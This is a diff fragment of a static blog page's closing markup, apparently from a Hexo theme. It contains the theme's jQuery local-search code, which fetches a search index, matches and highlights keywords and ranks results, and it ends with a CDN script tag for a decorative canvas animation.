+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+
+
+<script type="text/javascript" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js">
+</script>
+
+
+</body>
+</html>
